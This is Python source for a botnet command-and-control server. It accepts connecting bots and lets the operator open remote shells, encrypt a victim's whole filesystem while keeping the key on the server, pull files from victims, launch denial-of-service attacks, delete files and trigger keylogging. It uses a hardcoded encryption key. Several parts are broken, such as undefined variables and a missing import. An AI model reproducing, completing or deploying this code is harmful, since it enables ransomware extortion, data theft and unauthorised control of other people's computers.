#!/usr/bin/python3
# c&c server 
# version 1.0
import cryptography
import sys
import os
import socket
import threading
import time

from cmd import Cmd
from cryptography.fernet import Fernet
from datetime import datetime
        

def print_log(msg):
    current_date_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f'[{current_date_time}] {msg}')

def encr_data(fileData):
    key = "dssMKeQcclJGWbClsNSGN7hiPm7UMqR7CHi7SrKZz8w="
    fernet = Fernet(key)
    encryptedData = fernet.encrypt(fileData)
    return encryptedData    

def decr_data(fileData):
    key = "dssMKeQcclJGWbClsNSGN7hiPm7UMqR7CHi7SrKZz8w="
    fernet = Fernet(key)
    decryptedData = fernet.decrypt(fileData)
    return decryptedData

def check_dir(dirPath):
    current_date_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    if os.path.exists(str(dirPath)):
        #self.print_log(f'Directory {dirPath} exists.')
        pass
    else:
        print(f'[{current_date_time}] Directory {dirPath} not exists --> creating...')
        os.makedirs(dirPath)

class botOptions:
    shell = '303'
    encrypter = '999'
    listfs = '304'
    upload_file = '305'
    upload_dir = '306'
    downlaod_file = '307'
    dos = '308'
    ping = '201'
    rm = '310'
    keylogger = '666'
    decrypter = '989'

class ShellCommands(Cmd):
    def do_exit(self, inp):
        print_log('[--] interactive mode')
        return True
    
    def do_encryp(self):
        '''encrypts the complete filesystem of the connected target bot'''
        client_sock.send(botOptions.encrypter.encode())
        key = Fernet.generate_key()
        key = key.decode()
        self.send_encr(key, client_sock)
        path = f"/etc/cc-server/{client_addr}-encr.key"
        try:
            with open (path, 'w') as f:
                f.write(str(key))
            f.close()
            print_log(f'[**] key written to {path}')
        except FileNotFoundError:
            os.mkdir("/etc/cc-server")
            with open (path, 'w') as f:
                f.write(str(key))
            f.close()
            print_log(f'[**] key written to {path}')
        print_log(f'[**] encrypting files from {client_addr}')
        while True:
            file = self.recv_encr(2048, client_sock)
            if file == botOptions.encrypter:
                print_log(f'[**] files encrypted')
                break
            answ = self.recv_encr(1024, client_sock)
            if answ == "200":
                print_log(f'[**] encrypted file: {file}')
            elif answ == botOptions.encrypter:
                print_log(f'[**] files encrypted')
                break
            else:
                print_log(f'[WW] recieved status : {answ}')     

class CCServer:
    def __init__(self, addr, port):
        
        self.addr = addr
        self.port = port
        self.encr = False
        self.i = 0
        self.shell = True
        fill = 50 * ','
        self.botArray = botArray = [[fill],[fill]]        
        self.ccsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    
    def run(self):

        try:
            self.ccsocket.bind((self.addr, self.port))
            self.ccsocket.listen(100)
            print_log('[**] C&C server online. (Ctrl-D for interactive mode)')
            print_log(f'[**] listen mode [{self.addr}]::[{self.port}] ')
        except Exception as e:
            print_log(f'[EE] failed to start C&C server: {e}')
        while True:
            client_socket, client_addr = self.ccsocket.accept()
            self.botArray[self.i][self.i] = [[self.i],[client_socket]]
            self.i += 1
            print_log(f'[++] new bot connected [{client_addr}]')
            client_thread = threading.Thread(target=self.handle, args=(client_socket, client_addr))
            client_thread.start()   
        
    def interactive_mode(self, client_sock, client_addr):
        self.help_menu()
              
        cmd = ''
        try:
            ShellCommands(client_sock, client_addr).cmdloop()
            #cmd = input()
        except:
            #cmd = input('cmd:> ')
            print("didnt work")
            cmdArray = ["-s","-encr","-decr","-ls","-uf","-ud","-d","-dos","-p","-rm","-k", "-b"]
        try:
            for i in range(len(cmdArray)):
                if cmdArray[i] in cmd:
                    if cmdArray[i] == "-s":
                        #self.send_encr(botOptions.shell, client_sock)
                        client_sock.send(botOptions.shell.encode())
                        #shell = self.recv_encr(4096, client_sock)
                        shell = client_sock.recv(4096).decode()
                        buffer = input(shell)
                        buffer += '@'
                        self.shell_tracking()
                        #self.send_encr(buffer, client_sock)
                        client_sock.send(buffer.encode())
                        try:
                            while True:
                                response = ''
                                recv_len = 1                            
                                while recv_len:
                                    #data = self.recv_encr(4096, client_sock)
                                    data = client_sock.recv(4096)
                                    recv_len = len(data)
                                    response += data.decode()
                                    if recv_len < 4096:
                                        break
                                if response:
                                    print(response)
                                try:
                                    buffer = input(shell)
                                except EOFError:
                                    pass
                                buffer += '@'
                                    #self.send_encr(buffer, client_sock)
                                client_sock.send(buffer.encode())
                                if buffer == "exit()@":
                                    break                                
                                #else:
                                #    buffer = input(shell)
                                #    buffer += '@'
                                #    client_sock.send(buffer.encode())
                        
                        except KeyboardInterrupt:
                            print_log("[--] recieved exit status.")
                            client_sock.send('exit()'.encode())
                            self.resetBotArray(client_sock)
                            client_sock.close() 
                            break
                    elif cmdArray[i] == "-encr":
                        client_sock.send(botOptions.encrypter.encode())
                        key = Fernet.generate_key()
                        key = key.decode()
                        self.send_encr(key, client_sock)
                        path = f"/etc/cc-server/{client_addr}-encr.key"
                        try:
                            with open (path, 'w') as f:
                                f.write(str(key))
                            f.close()
                            print_log(f'[**] key written to {path}')
                        except FileNotFoundError:
                            os.mkdir("/etc/cc-server")
                            with open (path, 'w') as f:
                                f.write(str(key))
                            f.close()
                            print_log(f'[**] key written to {path}')
                        print_log(f'[**] encrypting files from {client_addr}')
                        while True:
                            file = self.recv_encr(2048, client_sock)
                            if file == botOptions.encrypter:
                                print_log(f'[**] files encrypted')
                                break
                            answ = self.recv_encr(1024, client_sock)
                            if answ == "200":
                                print_log(f'[**] encrypted file: {file}')
                            elif answ == botOptions.encrypter:
                                print_log(f'[**] files encrypted')
                                break
                            else:
                                print_log(f'[WW] recieved status : {answ}')
                    elif cmdArray[i] == "-decr":
                        key_file = input("enter key-file path: ")
                        with open (key_file, 'r') as f:
                            key = f.read()
                        f.close()
                        print_log(f"[**] sending key to {client_addr}")
                        client_sock.send(botOptions.decrypter.encode())
                        time.sleep(0.5)
                        self.send_encr(key, client_sock)
                        print_log(f'[**] decrypting files from {client_addr}')
                        while True:
                            file = self.recv_encr(2048, client_sock)
                            if file == botOptions.encrypter:
                                print_log(f'[**] files decrypted')
                                break
                            answ = self.recv_encr(1024, client_sock)
                            if answ == "200":
                                print_log(f'[**] decrypted file: {file}')
                            elif answ == botOptions.decrypter:
                                print_log(f'[**] files decrypted')
                                break
                            else:
                                print_log(f'[WW] recieved status : {answ}')                    
                    elif cmdArray[i] == "-dos":
                            for x in range(len(cmd)):
                                if cmd[x] == '(':
                                    curlPos = x
                                elif cmd[x] == ')':
                                    curlPos2 = x
                                elif cmd[x] == ',':
                                    commaPos = x
                            target = cmd[curlPos:commaPos]
                            client_sock.send(target.encode())
                            port = cmd[commaPos:curlPos2]
                            client_sock.send(port.encode())
                            
                    elif cmdArray[i] == "-p":
                        client_sock.send(botOptions.ping.encode())
                        ping = client_sock.recv(1024).decode()
                        print_log(ping)
                    elif cmdArray[i] == "-ls":
                        print_log(f'[**] requesting filesystem from bot {client_addr}')
                        client_sock.send(botOptions.listfs.encode())
                        response = ''
                        recv_len = True                            
                        while recv_len:
                            #data = self.recv_encr(4096, client_sock)
                            data = client_sock.recv(1024)
                            recv_len = len(data)
                            response += data.decode()
                            if recv_len < 1024:
                                break
                        if response:
                            try:
                                path = f'/etc/cc-server/{client_addr}-filesystem.md'
                                with open (path, 'w') as f:
                                    f.write(response)
                                f.close()
                                print_log(f'[**] fs written to {path}')
                            except FileNotFoundError:
                                os.mkdir("/etc/cc-server")
                                path = f'/etc/cc-server/{client_addr}-filesystem.md'
                                with open (path, 'w') as f:
                                    f.write(response)
                                f.close()
                                print_log(f'[**] fs written to {path}')
                        else:
                            print_log(f'[WW] no filesystem recieved from{client_addr}')
                            self.resetBotArray(client_sock)
                    elif cmdArray[i] in "-uf":
                        client_sock.send(botOptions.upload_file.encode())
                        print_log(f'[**] requesting download from {client_addr}')
                        file = cmd[4:]
                        #self.send_encr(file, client_sock)
                        client_sock.send(file.encode())
                        response = ''
                        recv_len = True                            
                        while recv_len:
                            #data = self.recv_encr(4096, client_sock)
                            data = client_sock.recv(1024)
                            recv_len = len(data)
                            response += data.decode()
                            if recv_len < 1024:
                                break
                        if response:
                            file = self.clear_file(file)
                            try:
                                path = f'/etc/cc-server/{client_addr}-{file}.md'
                                with open (path, 'w') as f:
                                    f.write(response)
                                f.close()
                                print_log(f'[**] fs written to {path}')
                            except FileNotFoundError:
                                os.mkdir("/etc/cc-server")
                                path = f'/etc/cc-server/{client_addr}-{file}.md'
                                with open (path, 'w') as f:
                                    f.write(response)
                                f.close()
                                print_log(f'[**] fs written to {path}')                            
                            
                        
            else:
                #print_log('[--] interactive mode. no command specified.')
                pass
        except ConnectionResetError:
            self.resetBotArray(client_sock)
        except cryptography.fernet.InvalidToken:
            self.resetBotArray(client_sock)
        print_log('[--] interactive mode')
        print_log(f'[**] listen mode [{self.addr}]::[{self.port}] ')
        
    def help_menu(self):
        print_log('[++] interactive mode')
        print_log('[II] Command & Control server') 
        print_log('[II] usage: [-s] [-encr] [-ls] [-uf=FILE] [-ud=DIR] [-d=FILE->DEST] [-dos=(TARGET,PORT)] [-p] [-rm=FILE/DIR] [-k]')    
            
    def handle(self, client_socket, client_addr):
        pynputOK = client_socket.recv(1024).decode()
        cryptographyOK = client_socket.recv(1024).decode()
        if cryptographyOK[1:3] == '**':
            self.encr = True
        else:
            self.encr = False
        print_log(pynputOK)
        print_log(cryptographyOK)
        self.key_tracking(client_socket, client_addr)
        
        
    def listen_key(self, client_sock, client_addr):
        while True:
            if keyboard.is_pressed('ctrl + d'):
                #print_log('ctrl + d pressed')
                #interactive_thread = threading.Thread(target=self.interactive_mode, args=(client_sock,))
                #interactive_thread.start()
                self.interactive_mode(client_sock, client_addr)
    
    def shell_listen(self):
        while self.shell:
            if keyboard.is_pressed('ctrl + x'):
                self.shell = False
    
    def key_tracking(self, client_sock, client_addr):
        listen_thread = threading.Thread(target=self.listen_key, args=(client_sock,client_addr))
        listen_thread.start()
    
    def shell_tracking(self):
        listen_thread = threading.Thread(target=self.shell_listen)
        listen_thread.start()
    
    def recv_encr(self, byte, client_sock):
        if self.encr:
            req = client_sock.recv(byte)
            req = decr_data(req)
            req = req.decode()
        else:
            req = client_sock.recv(byte).decode()
        return req
    
    def send_encr(self, msg, client_sock):
        if self.encr:
            msg = msg.encode()
            msg = encr_data(msg)
            client_sock.send(msg)
        else:
            client_sock.send(msg.encode())    
    
    def resetBotArray(self, client_sock):
        for i in range(len(self.botArray)):
            if self.botArray[i-1][i-1] == [[i-1],[client_sock]]:
                print_log(f'[WW] bot [{i}] disconnected')
                for i in range(len(self.botArray)):
                    if i == 1:
                        self.botArray[0][0] = [[','],[',']]
                    else:    
                        self.botArray[i][i] = self.botArray[i][i]   
        self.i -= 1
    
    def clear_file(self, file):
        slash = '/'
        slashPos = []
        for pos, char in enumerate(file):
            if (char == slash):
                slashPos.append(pos)
        for i in range(len(slashPos)):
            file = file.replace(file[slashPos[i]], '>')
        return file         
        
def main():    
    configfile = '/etc/ccserver/config.csv'
    serveraddr = ''
    serverport = 0
    if os.path.exists(configfile):
        with open(configfile, 'r') as configFile:
            ccserver_config = configFile.read()
        configFile.close()
        comma = ','
        commaPos = []    
        for pos, char in enumerate(ccserver_config):
            if (char == comma):
                commaPos.append(pos)        
        serveraddr = str(ccserver_config[commaPos[0]+1:commaPos[1]])
        serverport = str(ccserver_config[commaPos[1]+1:commaPos[2]])
    else:
        print("---server configuration---")
        serveraddr = input("enter server address: ")
        serverport = input("enter server port: ")
        check_dir('/etc/ccserver')
        with open(configfile, 'w') as configFile:
            configFile.write(',' + str(serveraddr) + ',' + str(serverport) + ',')
        configFile.close()
        print("configuration written to ", configfile)    

    newCC = CCServer(serveraddr, int(serverport))
    newCC.run()
   
 
try:
    main()
except KeyboardInterrupt:
    print_log("[--] recieved exit status.")
    sys.exit()
except Exception as e:
    print_log(f"[EE] server-error: {e}")
    sys.exit()
